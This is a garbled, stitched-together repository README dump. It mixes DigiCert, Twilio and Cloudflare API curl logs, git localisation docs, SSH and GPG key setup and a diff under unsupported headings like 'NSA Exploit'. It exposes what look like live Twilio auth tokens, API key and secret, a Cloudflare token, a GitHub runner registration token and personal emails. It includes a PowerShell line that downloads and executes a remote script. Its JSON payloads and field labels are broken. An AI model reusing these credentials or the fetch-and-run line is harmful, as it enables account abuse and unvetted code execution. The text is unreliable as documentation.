+ strict-transport-security: max-age=15724800 
+ transfer-encoding: Identity 
+ vary: Accept-Encoding 
+ x-cdn: Imperva 
+ x-content-type-options: nosniff 
+ x-envoy-decorator-operation: account.dcone-prod.svc.cluster.local:8080/* 
+ x-envoy-upstream-service-time: 6 
+ x-frame-options: same-origin 
+ x-iinfo: 12-53698010-53698015 NNNY CT(35 38 0) RT(1710564042696 63) q(0 0 0 -1) r(1 1) U11 
+ x-xss-protection: 1; mode=block
+
+curl -X 'GET' \
+  'https://one.digicert.com/account/api/v1/account?active=all&name=6309304695' \
+  -H 'accept: application/json' \
+  -H 'X-API-Key: 10000'
+Request URL
+https://one.digicert.com/account/api/v1/account?active=all&name=6309304695
+Server response
+Code Details
+403
+Undocumented
+Error: Forbidden
+
+Response body
+Download
+{
+  "errors": [
+    {
+      "code": "AUTHORIZATION_ERROR",
+      "message": "No authentication data provided"
+    }
+  ]
+}
+Response headers
+ cache-control: no-cache,no-store,max-age=0,must-revalidate 
+ connection: keep-alive 
+ content-encoding: gzip 
+ content-security-policy: default-src 'self' dctrustassistant: http://localhost:*/ http://127.0.0.1:*/ https://127.0.0.1:*/ https://assets.adobedtm.com/ https://*.pendo.io/  https://www.googletagmanager.com/  https://www.google-analytics.com/ https://purecatamphetamine.github.io https://*.fullstory.com/ https://*.digicert.com/ https://fonts.googleapis.com https://fonts.gstatic.com https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.12.313/pdf.worker.js https://*.storage.googleapis.com/ https://services.nvd.nist.gov blob: data: 'unsafe-inline' 'unsafe-eval'; 
+ content-type: application/json 
+ date: Sat,16 Mar 2024 04:42:23 GMT 
+ expires: 0 
+ pragma: no-cache 
+ referrer-policy: no-referrer 
+ strict-transport-security: max-age=15724800 
+ transfer-encoding: Identity 
+ vary: Accept-Encoding 
+ x-cdn: Imperva 
+ x-content-type-options: nosniff 
+ x-envoy-decorator-operation: account.dcone-prod.svc.cluster.local:8080/* 
+ x-envoy-upstream-service-time: 6 
+ x-frame-options: same-origin 
+ x-iinfo: 7-14411267-14411269 NNNY CT(36 40 0) RT(1710564142411 41) q(0 0 0 -1) r(1 1) U11 
+ x-xss-protection: 1; mode=block 
+Responses
+Code Description Links
+200 
+List of accounts
+
+Media type
+
+Controls Accept header.
+Examples
+
+Example Value
+Schema
+[
+  {
+    "id": "50580ac7-60e4-4df2-a834-d12c1ab79afb",
+    "name": "Example account 1",
+    "active": true,
+    "service_period": {
+      "from": "2021-05-25",
+      "to": "2022-05-25"
+    },
+    "friendly_identifier": "5258283",
+    "admins": [
+      {
+        "id": "833e4906-fc45-4bd3-841e-40506c0e8ca8",
+        "email": "api_service_user_1@example.com"
+      },
+      {
+        "id": "fa8285c7-5e35-4ea8-8cc4-dc95f7dc3cd6",
+        "email": "api_service_user_2@example.com"
+      },
+      {
+        "id": "7d78b46a-c635-4bda-8b6d-13802046a963",
+        "name": "John Doe",
+        "email": "account_user_1@example.com"
+      }
+    ],
+    "sign_in_methods": [
+      {
+        "signInMethod": "standard",
+        "status": "enabled",
+        "mfaStatus": "disabled",
+        "clientAuthCertLoginEnabled": false
+      }
+    ],
+    "locale": "en_US"
+  },
+  {
+    "id": "be5ffbd2-1a50-4675-912f-2fe015812f87",
+    "name": "Example account 2",
+    "active": true,
+    "service_period": {
+      "from": "2021-05-26",
+      "to": "2022-05-26"
+    },
+    "friendly_identifier": "7092363",
+    "admins": [],
+    "sign_in_methods": [
+      {
+        "signInMethod": "standard",
+        "status": "enabled",
+        "mfaStatus": "disabled",
+        "clientAuthCertLoginEnabled": false
+      }
+    ],
+    "locale": "en_US"
+  }
+]
+
+Curl
+
+curl -X 'GET' \
+  'https://one.digicert.com/account/api/v1/api-access-token?user_id=fa5e727c-0527-44e0-9004-5fdc347b0b3f' \
+  -H 'accept: application/json' \
+  -H 'X-API-Key: 10000'
+Request URL
+https://one.digicert.com/account/api/v1/api-access-token?user_id=fa5e727c-0527-44e0-9004-5fdc347b0b3f
+Server response
+Code Details
+403
+Undocumented
+Error: Forbidden
+
+Response body
+Download
+{
+  "errors": [
+    {
+      "code": "AUTHORIZATION_ERROR",
+      "message": "No authentication data provided"
+    }
+  ]
+}
+Response headers
+ cache-control: no-cache,no-store,max-age=0,must-revalidate 
+ connection: keep-alive 
+ content-encoding: gzip 
+ content-security-policy: default-src 'self' dctrustassistant: http://localhost:*/ http://127.0.0.1:*/ https://127.0.0.1:*/ https://assets.adobedtm.com/ https://*.pendo.io/  https://www.googletagmanager.com/  https://www.google-analytics.com/ https://purecatamphetamine.github.io https://*.fullstory.com/ https://*.digicert.com/ https://fonts.googleapis.com https://fonts.gstatic.com https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.12.313/pdf.worker.js https://*.storage.googleapis.com/ https://services.nvd.nist.gov blob: data: 'unsafe-inline' 'unsafe-eval'; 
+ content-type: application/json 
+ date: Sat,16 Mar 2024 04:44:01 GMT 
+ expires: 0 
+ pragma: no-cache 
+ referrer-policy: no-referrer 
+ strict-transport-security: max-age=15724800 
+ transfer-encoding: Identity 
+ vary: Accept-Encoding 
+ x-cdn: Imperva 
+ x-content-type-options: nosniff 
+ x-envoy-decorator-operation: account.dcone-prod.svc.cluster.local:8080/* 
+ x-envoy-upstream-service-time: 5 
+ x-frame-options: same-origin 
+ x-iinfo: 15-83048556-83048560 NNNY CT(36 38 0) RT(1710564241016 44) q(0 0 0 -1) r(1 1) U11 
+ x-xss-protection: 1; mode=block 
+Responses
+Code Description Links
+200 
+Success
+
+Media type
+
+Controls Accept header.
+Example Value
+Schema
+[
+  {
+    "id": "7b5d83e7-6e5f-4ade-ad48-111c6f3420f7",
+    "user_id": "e7ea1214-d688-48ba-aa1b-131fb2867ac5",
+    "name": "API token name",
+    "end_date": "2022-05-30T23:59:59Z",
+    "start_date": "2021-06-25T21:20:06Z",
+    "active": true,
+    "enabled": true,
+    "masked_api_key": "*************9e2a1"
+  }
+]
+
+Curl
+
+curl -X 'GET' \
+  'https://one.digicert.com/account/api/v1/locales' \
+  -H 'accept: application/json' \
+  -H 'X-API-Key: 10000'
+Request URL
+https://one.digicert.com/account/api/v1/locales
+Server response
+Code	Details
+200	
+Response body
+Download
+[
+  {
+    "code": "de_DE",
+    "language": "Deutsch"
+  },
+  {
+    "code": "en_US",
+    "language": "English"
+  },
+  {
+    "code": "es_ES",
+    "language": "Español"
+  },
+  {
+    "code": "fr_FR",
+    "language": "Français"
+  },
+  {
+    "code": "it_IT",
+    "language": "Italiano"
+  },
+  {
+    "code": "ja_JP",
+    "language": "日本語"
+  },
+  {
+    "code": "ko_KR",
+    "language": "한국어"
+  },
+  {
+    "code": "nl_NL",
+    "language": "Nederlands"
+  },
+  {
+    "code": "pt_BR",
+    "language": "Português"
+  },
+  {
+    "code": "ru_RU",
+    "language": "Русский"
+  },
+  {
+    "code": "zh_CN",
+    "language": "简体中文"
+  },
+  {
+    "code": "zh_TW",
+    "language": "繁體中文"
+  }
+]
+Response headers
+ cache-control: no-cache,no-store,max-age=0,must-revalidate 
+ connection: keep-alive 
+ content-encoding: gzip 
+ content-security-policy: default-src 'self' dctrustassistant: http://localhost:*/ http://127.0.0.1:*/ https://127.0.0.1:*/ https://assets.adobedtm.com/ https://*.pendo.io/  https://www.googletagmanager.com/  https://www.google-analytics.com/ https://purecatamphetamine.github.io https://*.fullstory.com/ https://*.digicert.com/ https://fonts.googleapis.com https://fonts.gstatic.com https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.12.313/pdf.worker.js https://*.storage.googleapis.com/ https://services.nvd.nist.gov blob: data: 'unsafe-inline' 'unsafe-eval'; 
+ content-type: application/json 
+ date: Sat,16 Mar 2024 04:50:15 GMT 
+ expires: 0 
+ pragma: no-cache 
+ referrer-policy: no-referrer 
+ strict-transport-security: max-age=15724800 
+ transfer-encoding: Identity 
+ vary: Accept-Encoding 
+ x-cdn: Imperva 
+ x-content-type-options: nosniff 
+ x-envoy-decorator-operation: account.dcone-prod.svc.cluster.local:8080/* 
+ x-envoy-upstream-service-time: 7 
+ x-frame-options: same-origin 
+ x-iinfo: 18-118172517-118172518 NNNN CT(35 39 0) RT(1710564614160 42) q(0 0 0 -1) r(1 1) U2 
+ x-xss-protection: 1; mode=block 
+Responses
+Code	Description	Links
+200	
+Locales list
+
+Media type
+
+Controls Accept header.
+Examples
+
+Example Value
+Schema
+[
+  {
+    "code": "de_DE",
+    "language": "Deutsch"
+  },
+  {
+    "code": "en_US",
+    "language": "English"
+  },
+  {
+    "code": "es_ES",
+    "language": "Español"
+  },
+  {
+    "code": "fr_FR",
+    "language": "Français"
+
 Host github.com-repo-0
         Hostname github.com
         IdentityFile=/home/user/.ssh/repo-0_deploy_key

6309304695-patch-209 had recent pushes 25 minutes ago
6309304695-patch-210 had recent pushes 24 minutes ago
This branch is 1282 commits ahead of scpwiki/sigma:main.
Folders and files
Name	
Latest commit
6309304695
6309304695
17 minutes ago
History

.devcontainer
5 days ago

.github
3 weeks ago

fonts
last year

images
2 weeks ago

.editorconfig
last week

.gitignore
5 days ago

.prettierrc.toml
last week

.stylelintrc.yaml
10 months ago

LICENSE.md
last week

ReadMe.md
17 minutes ago
Repository files navigation

README

License
image

https://accounts.twilio.com/v1

curl -G https://accounts.twilio.com/v1/Credentials/PublicKeys
-u '[AC32c8d23aa9b687b5ac871ee3e016f518]:[4fb36b6ca3adcce02c96307d8feb6131]' You docker run -it --rm twilio/twilio-cli bash Once the container has finished downloading, and you have entered the shell, you can issue commands using the CLI. For example:

$ docker run -it --rm twilio/twilio-cli bash

root@1234:/twilio# twilio profiles:list ID Account SID Active you AC32c8d23aa9b687b5ac871ee3e016f518 true main AC32c8d23aa9b687b5ac871ee3e016f518 false Run commands directly

It is also possible to pass commands directly to the Docker image for single, contained operations. For example, you can check the running version of the Twilio CLI with the following:

$ docker run -it --rm twilio/twilio-cli twilio --version twilio-cli/3.0.0 linux-x64 node-v14.18.1

$ export TWILIO_ACCOUNT_SID=AC32c8d23aa9b687b5ac871ee3e016f518 $ export TWILIO_API_KEY=SKa6c746877c431ab8185993d610d1d891 $ export TWILIO_API_SECRET=bzNwslKpvbgziV6IEpGYeIOJLnLWvJ7K $ docker run -it --rm
-e TWILIO_ACCOUNT_SID \AC32c8d23aa9b687b5ac871ee3e016f518 -e TWILIO_API_KEY \SKa6c746877c431ab8185993d610d1d891 -e TWILIO_API_SECRET \bzNwslKpvbgziV6IEpGYeIOJLnLWvJ7K twilio/twilio-cli twilio phone-numbers:18886235040

SID

$ docker run -it --rm
-v ~/.twilio-cli:/root/.twilio-cli
twilio/twilio-cli twilio phone-numbers:list

SID Phone Number Friendly Name AC32c8d23aa9b687b5ac871ee3e016f518 +18886235040 (18886235040)

$ docker run -it --rm
-v ~/.twilio-cli:/root/.twilio-cli
twilio/twilio-cli twilio phone-numbers:list

SID Phone Number Friendly Name AC32c8d23aa9b687b5ac871ee3e016f518 +18886235040 (18886235040)

AC32c8d23aa9b687b5ac871ee3e016f518 Account sid cdebfd226c921a938ca472d73d424224

cdebfd226c921a938ca472d73d424224

Auth token

+18886235040 phone number

Org SID gods time travel corporation

ORd50b4acdc2a920bbf44b76a2ab31b127

API key SKa6c746877c431ab8185993d610d1d891

Secret api

Live credentials

AC32c8d23aa9b687b5ac871ee3e016f518

Test credentials

Account SID- used to exercise the REST API AC6e31488a2cc09cb91f378f2a03dd40d4 Test Auth token

9956cd27a83db54b04ec6527603579d6 Keep Primary Auth token 4fb36b6ca3adcce02c96307d8feb6131

brew tap twilio/brew && brew install twilio

scoop bucket known

scoop bucket add extras

scoop bucket add extras https://github.com/lukesampson/scoop-extras.git

scoop bucket add

git clone https://github.com//my-bucket cd my-bucket '{ version: "1.0", url: "https://gist.github.com/lukesampson/6446238/raw/hello.ps1", bin: "hello.ps1" }' > hello.json git add . git commit -m "add hello app" git push

scoop bucket add my-bucket https://github.com//my-bucket

scoop bucket list # -> you should see 'my-bucket' scoop search hello # -> you should see hello listed under, 'my-bucket bucket:' scoop install hello hello # -> you should see 'Hello, !'

scoop install php apache

iex (new-object net.webclient).downloadstring('https://gist.githubusercontent.com/nilkesede/c98a275b80b6d373131df82eaba96c63/raw/apache-php-init.ps1')

httpd

"$(scoop which httpd | split-path)..\conf\httpd.conf"

sudo httpd -k install -n apache sudo net start apache

write an app manifest to hello.json

'{ "version": "1.0", "url": "https://gist.github.com/lukesampson/6446238/raw/hello.ps1", "bin": "hello.ps1" }' > hello.json

install the app

scoop install hello

did it work?

hello # -> should output 'Hello, !'

scoop install \shared\files\scoop\hello.json

scoop install https://gist.github.com/lukesampson/6446567/raw/hello.json make

make install

git format-patch -o output_dir master..foo

git clone https://github.com//git

git remote add gitgitgadget https://github.com/gitgitgadget/git

git fetch gitgitgadget git-gui/master

git checkout -b git-gui/master

mvn clean package

sudo -u postgres psql < sql/createdatabase.sql sudo -u postgres psql biblivre4 < sql/biblivre4.sql

install.packages("remotes")

remotes::install_github("asgr/Rfits")

library(Rfits)

basic example code

file_image=system.file('extdata', 'image.fits', package = "Rfits") temp_image=Rfits_read_image(file_image, header=TRUE) file_table = system.file('extdata', 'table.fits', package = "Rfits") temp_table = Rfits_read_table(file_table, header=TRUE)

data=list(temp_image, temp_table)

file_mix_temp = tempfile()

Rfits_write_all(data, file_mix_temp)

data2 = Rfits_read_all(file_mix_temp)

sum(data[[1]]$imDat - data2[[1]]$imDat) #> [1] 0

cols_check = which(sapply(temp_table[1,], is.numeric)) sum(data[[2]][,..cols_check] - data2[[2]][,..cols_check]) #> [1] 0

rest wavelngth in units of Angstrom

lam_0 = 6563

denisty parameter either 0 or 2 [0 untested]

s = [2]

Number of photons to send out

nPhotons = 1e4

Optical depth (can be list)

tau_range = [5]

Electron temperature from just above formation site to edge of boundary, can be list

Te_range = [(30e3,10e3)]

#unitless radius of scattering region, cal be list R_range = [10]

wind velocity (untested), can be list

vwind = [0] #km/s

Shock velocity in km/s, can be list

vsh = [5500]

python escatter.py

matplotlib==3.8.0 numpy==1.26.2 tqdm==4.66.1

git-gui/ comes from git-gui project, maintained by Pratyush Yadav:
https://github.com/prati0100/git-gui.git

gitk-git/ comes from Paul Mackerras's gitk project:
git://ozlabs.org/~paulus/gitk

make po-init PO_FILE="po/XX.po"

$ git clone https://github.com/git-l10n/git-po-helper.git $ cd git-po-helper $ make $ make test

$ cp git-po-helper /usr/local/bin/

$ git-po-helper -h Helper for git l10n

Usage: git-po-helper [flags] git-po-helper [command]

Available Commands: check Check all ".po" files and commits check-commits Check commits for l10n conventions check-po Check syntax of XX.po file diff Show changes between two l10n files help Help about any command init Create XX.po file team Show team leader/members update Update XX.po file version Display the version of git-po-helper

Flags: -h, --help help for git-po-helper -q, --quiet count quiet mode -v, --verbose count verbose mode -V, --version Show version

Use "git-po-helper [command] --help" for more information about a command. https://github.com/git-l10n/git-po/

+-------------------+ +------------------+ | Git source code | ----(2)---> | L10n coordinator | | repository | <---(5)---- | repository | +-------------------+ +------------------+ | | ^ (1) (3) (4) V v | +----------------------------------+ | Language Team XX | +----------------------------------+

make po/git.pot

make po/git-core.pot

make po-init PO_FILE=po/XX.po

make po-update PO_FILE=po/XX.po

/po/XX.po filter=gettext-no-location

git config --global filter.gettext-no-location.clean
"msgcat --no-location -"

git config --global filter.gettext-no-location.clean
"msgcat --add-location=file -"

make

git-po-helper check-po po/XX.po git-po-helper check-commits

TRANSLATORS: Make sure to include [y], [n], [e], [v] and [a]

in your translation. The program will only accept English

input at this point.

gettext "Apply? [y]es/[n]o/[e]dit/[v]iew patch/[a]ccept all "

/* TRANSLATORS: %s will be "revert" or "cherry-pick" */ die(_("%s: Unable to write new index file"), action_name(opts));

printf(_("HEAD is now at %s"), hex);

printf(Q_("%d commit", "%d commits", number_of_commits));

static const char *reset_type_names[] = { N_("mixed"), N_("soft"), N_("hard"), N_("merge"), N_("keep"), NULL };

die(_("%s reset is not allowed in a bare repository"), _(reset_type_names[reset_type]));

. git-sh-setup . git-sh-i18n

For constant interface messages:

gettext "A message for the user"; echo

To interpolate variables:

details="oh noes" eval_gettext "An error occurred: $details"; echo

For constant interface messages:

gettextln "A message for the user"

To interpolate variables:

details="oh noes" eval_gettextln "An error occurred: $details"

use Git::I18N; print __("Welcome to Git!\n"); printf __("The following error occurred: %s\n"), $error;

git log --reverse -p --grep=i18n git-am.sh

git commit -s

git-po-helper check-po <XX.po>

git-po-helper team --check

$ ls -al ~/.ssh

Lists the files in your .ssh directory, if they exist

$ eval "$(ssh-agent -s)"

Agent pid 59566
$ open ~/.ssh/config

The file /Users/YOU/.ssh/config does not exist.
touch ~/.ssh/config

Host github.com AddKeysToAgent yes UseKeychain yes IdentityFile ~/.ssh/id_ed25519

ssh-add --apple-use-keychain ~/.ssh/id_ed25519

ssh-keygen -t ed25519 -C "6309304695z@gmail.com"

use: ssh-keygen -t rsa -b 4096 -C "6309304695z@gmail.com"

Generating public/private ALGORITHM key pair.
Enter a file in which to save the key (/Users/YOU/.ssh/id_ALGORITHM): [Press enter] At the prompt, type a secure passphrase. For more information, see "Working with SSH key passphrases." Enter passphrase (empty for no passphrase): [Type a passphrase] Enter same passphrase again: [Type passphrase again]
$ eval "$(ssh-agent -s)"

Agent pid 59566
$ open ~/.ssh/config

The file /Users/YOU/.ssh/config does not exist.
touch ~/.ssh/config

Host github.com AddKeysToAgent yes UseKeychain yes IdentityFile ~/.ssh/id_ed25519

ssh-add --apple-use-keychain ~/.ssh/id_ed25519

ssh-keygen -t ed25519-sk -C "6309304695z@gmail.com”

ssh-keygen -t ecdsa-sk -C "6309304695z@gmail. > Enter a file in which to save the key (/Users/YOU/.ssh/id_ed25519_sk): [Press enter] When you are prompted to type a passphrase, press Enter.

Enter passphrase (empty for no passphrase): [Type a passphrase] Enter same passphrase again: [Type passphrase again]

<TOP SECRET/MAJIC/PLUTO File.md> image
  # GitHub CLI api
https://cli.github.com/manual/gh_api

$ RoadRunner ReadMe & $$$ NSA Exploit

'cloudfare id :137607714e07bfa3ae8d9385b95492cb'

curl --request GET
--url https://api.cloudflare.com/client/v4/accounts/account_identifier/billing/profile
--header 'Content-Type: application/json'
--header 'X-Auth-Email: god964v@gmail.com'

curl --request GET
--url https://api.cloudflare.com/client/v4/zones/zone_id/api_gateway/discovery
--header 'Content-Type: application/json'
--header 'X-Auth-Email: god964v@gmail.com'

curl --request GET
--url https://api.cloudflare.com/client/v4/zones/zone_id/api_gateway/discovery/operations
--header 'Content-Type: application/json'
--header 'X-Auth-Email: god964v@gmail.com'

curl --request PATCH
--url https://api.cloudflare.com/client/v4/zones/zone_id/api_gateway/discovery/operations
--header 'Content-Type: application/json'
--header 'X-Auth-Email: god964v@gmail.com'
--data '{ "3818d821-5901-4147-a474-f5f5aec1d54e": { "state": "ignored" }, "b17c8043-99a0-4202-b7d9-8f7cdbee02cd": { "state": "review" } }'

curl --request PATCH
--url https://api.cloudflare.com/client/v4/zones/zone_id/api_gateway/discovery/operations/operation_id
--header 'Content-Type: application/json'
--header 'X-Auth-Email: god964v@gmail.com'
--data '{010203040506070801020304050607080102030405060708}' "state": "review" }'

curl --request GET
--url https://api.cloudflare.com/client/v4/zones/zone_identifier/certificate_authorities/hostname_associations
--header 'Content-Type: application/json'
--header 'X-Auth-Email: god964v@gmail.com'

curl --request PUT
--url https://api.cloudflare.com/client/v4/zones/zone_identifier/certificate_authorities/hostname_associations
--header 'Content-Type: application/json'
--header 'X-Auth-Email: god964v@gmail.com'
--data '{010203040506070801020304050607080102030405060708}' "hostnames": [ "https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator" ], "mtls_certificate_id": "stringstringstringstringstringstring" }'

curl --request PUT
--url https://api.cloudflare.com/client/v4/zones/zone_identifier/certificate_authorities/hostname_associations
--header 'Content-Type: application/json'
--header 'X-Auth-Email: god964v@gmail.com'
--data '{010203040506070801020304050607080102030405060708}' "hostnames": [ "https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator" ], "mtls_certificate_id": "&34798AAFE0A7565088101CC4AE31C5C8C74461CB" }'

curl --request GET
--url https://api.cloudflare.com/client/v4/accounts/account_id/intel/asn/asn/subnets
--header 'Authorization: 2c1spor5BnkzWt0JnGi9udapUV2_5Mr7G95Tv9eLXmApDixbL'
--header 'Content-Type: application/json'

curl --request GET
--url https://api.cloudflare.com/client/v4/accounts/account_id/intel/whois
--header 'Authorization: 2c1spor5BnkzWt0JnGi9udapUV2_5Mr7G95Tv9eLXmApDixbL'
--header 'Content-Type: application/json'

curl --request GET
--url https://api.cloudflare.com/client/v4/zones/zone/spectrum/analytics/events/summary
--header 'Content-Type: application/json'
--header 'X-Auth-Email: god964v@gmail.com'

curl --request GET
--url https://api.cloudflare.com/client/v4/zones/zone/spectrum/analytics/events/summary
--header 'Content-Type: application/json'
--header 'X-Auth-Email: god964v@gmail.com'

curl --request POST
--url https://api.cloudflare.com/client/v4/zones/identifier/ssl/analyze
--header 'Content-Type: application/json'
--header 'X-Auth-Email: god964v@gmail.com'
--data '{010203040506070801020304050607080102030405060708}' "bundle_method": "ubiquitous", "certificate": "-----BEGIN CERTIFICATE-----\nMIIDtTCCAp2gAwIBAgIJAMHAwfXZ5/PWMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV\nBAYTAkFVMRMwEQYDVQQIEwpTb21lLVN0YXRlMSEwHwYDVQQKExhJbnRlcm5ldCBX\naWRnaXRzIFB0eSBMdGQwHhcNMTYwODI0MTY0MzAxWhcNMTYxMTIyMTY0MzAxWjBF\nMQswCQYDVQQGEwJBVTETMBEGA1UECBMKU29tZS1TdGF0ZTEhMB8GA1UEChMYSW50\nZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIB\nCgKCAQEAwQHoetcl9+5ikGzV6cMzWtWPJHqXT3wpbEkRU9Yz7lgvddmGdtcGbg/1\nCGZu0jJGkMoppoUo4c3dts3iwqRYmBikUP77wwY2QGmDZw2FvkJCJlKnabIRuGvB\nKwzESIXgKk2016aTP6/dAjEHyo6SeoK8lkIySUvK0fyOVlsiEsCmOpidtnKX/a+5\n0GjB79CJH4ER2lLVZnhePFR/zUOyPxZQQ4naHf7yu/b5jhO0f8fwt+pyFxIXjbEI\ndZliWRkRMtzrHOJIhrmJ2A1J7iOrirbbwillwjjNVUWPf3IJ3M12S9pEewooaeO2\nizNTERcG9HzAacbVRn2Y2SWIyT/18QIDAQABo4GnMIGkMB0GA1UdDgQWBBT/LbE4\n9rWf288N6sJA5BRb6FJIGDB1BgNVHSMEbjBsgBT/LbE49rWf288N6sJA5BRb6FJI\nGKFJpEcwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgTClNvbWUtU3RhdGUxITAfBgNV\nBAoTGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZIIJAMHAwfXZ5/PWMAwGA1UdEwQF\nMAMBAf8wDQYJKoZIhvcNAQELBQADggEBAHHFwl0tH0quUYZYO0dZYt4R7SJ0pCm2\n2satiyzHl4OnXcHDpekAo7/a09c6Lz6AU83cKy/+x3/djYHXWba7HpEu0dR3ugQP\nMlr4zrhd9xKZ0KZKiYmtJH+ak4OM4L3FbT0owUZPyjLSlhMtJVcoRp5CJsjAMBUG\nSvD8RX+T01wzox/Qb+lnnNnOlaWpqu8eoOenybxKp1a9ULzIVvN/LAcc+14vioFq\n2swRWtmocBAs8QR9n4uvbpiYvS8eYueDCWMM4fvFfBhaDZ3N9IbtySh3SpFdQDhw\nYbjM2rxXiyLGxB4Bol7QTv4zHif7Zt89FReT/NBy4rzaskDJY5L6xmY=\n-----END CERTIFICATE-----\n" }'

+WRITECERT +READCERT +WRITEKEY echo common.conf gpg.conf ~/.gnupg/pubring.gpg ~/.gnupg --full-generate-key ¶ --full-gen-key bkuptocard file Restore the given file pubring.kbx keytotpm --sign-key name --lsign-key name --quick-set-primary-uid user-id primary-user-id --detach-sign ¶ -b Make a detached signature.

--encrypt -e ' &34798AAFE0A7565088101CC4AE31C5C8C74461CB' gpg-connect-agent [options] [commands] /usr/local/var/run/gnupg/scdaemon/socket, configuration information is read from /usr/local/etc/gnupg/scdaemon.conf

gpg-connect-agent 'scd getinfo app_list' /bye scdaemon.conf reader_n.status --list-public-keys List the specified keys. If no keys are specified, then all keys from the configured public keyrings are listed.

Never use the output of this command in scripts or other programs. The output is intended only for humans and its format is likely to change. The --with-colons option emits the output in a stable, machine-parseable format, which is intended for use by scripts and other programs.

--list-secret-keys -K

--locate-keys ¶ --locate-external-keys --show-keys PIV).

--card-status

Signs a public key with your secret key but marks it as non-exportable. This is a shortcut version of the subcommand "lsign" from --edit-key.

--quick-sign-key fpr [names] ¶ --quick-lsign-key fpr [names]

~/.gnupg/pubring.kbx The public keyring using the new keybox format. This file is shared with gpgsm. You should backup this file. See above for the relation between this file and it predecessor.

To convert an existing pubring.gpg file to the keybox format, you first backup the ownertrust values, then rename pubring.gpg to publickeys.backup, so it won’t be recognized by any GnuPG versio

$ cd ~/.gnupg $ gpg --export-ownertrust >otrust.lst $ mv pubring.gpg publickeys.backup $ gpg --import-options restore --import publickeys.backup $ gpg --import-ownertrust otrust.lst

~/.gnupg/pubring.kbx.lock The lock file for pubring.kbx.

~/.gnupg/secring.gpg ~/.gnupg/secring.gpg.lock ~/.gnupg/.gpg-v21-migrated File indicating that a migration to GnuPG 2.1 has been done.

~/.gnupg/trustdb.gpg ~/.gnupg/trustdb.gpg.lock

~/.gnupg/random_seed ~/.gnupg/openpgp-revocs.d/

HOME Used to locate the default home directory.

GNUPGHOME If set directory used instead of "~/.gnupg".

GPG_AGENT_INFO This variable is obsolete; it was used by GnuPG versions before 2.1.

PINENTRY_USER_DATA gpgdir/gnupg.nls/langid.mo. Here gpgdir GNUPG_BUILD_ROOT GNUPG_EXEC_DEBUG_FLAGS gpg-connect-agent 'getinfo std_env_names' /bye | awk '$1=="D" { export-ownertrust gpg --export-ownertrust > otrust.txt --import-ownertrust otrust.txt cd ~/.gnupg rm trustdb.gpg gpg --import-ownertrust < otrust.txt --rebuild-keydb-caches

--gen-random 0|1|2|16|30 count

--tofu-policy {auto|good|unknown|bad|ask} keys "648c63bb32eaa48ed50bff8a5000d9f3065359372b82739a992a00ce758bfcd2 actions-runner-osx-x64-2.312.0.tar.gz" | shasum -a 256 -c

./config.sh --url https://github.com/6309304695/sigma-9 --token A4D7THKPGUP3WF5SOJVYMETFXIK2O

runs-on: self-hosted ReadMe.md

+gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpg/card> writecert PIV.9D < encr.crt + +gpgsm --with-keygrip -k 6309304695z@gmail.com +Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
ReadMe.md | 14 +++++++------- 1 file changed, 7 insertions(+), 7 deletions(-)

diff --git a/ReadMe.md b/ReadMe.md index 9f04e25..eed0212 100644 --- a/ReadMe.md +++ b/ReadMe.md @@ -10,7 +10,7 @@ File.md>

$ RoadRunner ReadMe & $$$ NSA Exploit -+WRITCERT +RESDCERT ++WRITECERT +READCERT +WRITEKEY echo

"648c63bb32eaa48ed50bff8a5000d9f3065359372b82739a992a00ce758bfcd2 actions-runner-osx-x64-2.312.0.tar.gz" | shasum -a 256 -c @@ -574,7 +574,7 @@ Name-Email: otto@example.net algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Encryption key for yk-9074625,O=example,C=DE

user id ..: otto@example.net
user id ..: 6309304695z@gmail.com +PIV authentication’ key with ssh: + +$ ssh-add -l +384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA) + +$ gpgsm --learn +$ gpg --full-gen-key +Please select what kind of key you want:
(1) RSA and RSA (default) @@ -593,11 +593,11 @@ Name-Email: otto@example.net y = key expires in n years +Key is valid for? (0) +Key does not expire at all +Is this correct? (y/N) y + +GnuPG needs to construct a user ID to identify your key. + +Real name: +Email address: otto@example.net +Comment: +You selected this USER-ID:

-"otto@example.net" +"6309304695z@gmail.com" +Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o +gpg: key C3AFA9ED971BB365 marked as ultimately trusted +gpg: revocation certificate stored as '[...]D971BB365.rev' +public and secret key created and signed. + +Note that this key cannot be used for encryption. You may want to use +the command "--edit-key" to generate a subkey for this purpose. +pub rsa2048 2019-04-04 [SC]

7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 -+uid otto@example.net +$ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 +Secret key is available. + +sec rsa2048/C3AFA9ED971BB365 ++uid keith bieszczat +$ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 +Secret key is available. + +sec rsa2048/C3AFA9ED971BB365

created: 2019-04-04 expires: never usage: SC card-no: FF020001008A77C1 @@ -894,7 +894,7 @@ steps: uses: crazy-max/ghaction-import-gpg@v6 with: gpg_private_key: ${{ 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 }}

passphrase: ${{ 010203040506070801020304050607080102030405060708 }}
passphrase: ${{ 010203040506070801020304050607080102030405060708 }}
name: List keys run: gpg -K @@ -915,7 +915,7 @@ steps: uses: crazy-max/ghaction-import-gpg@v6 with: gpg_private_key: ${{ 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 }}
passphrase: ${{ 010203040506070801020304050607080102030405060708 }}
passphrase: ${{ 010203040506070801020304050607080102030405060708}}
fingerprint: "5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81"
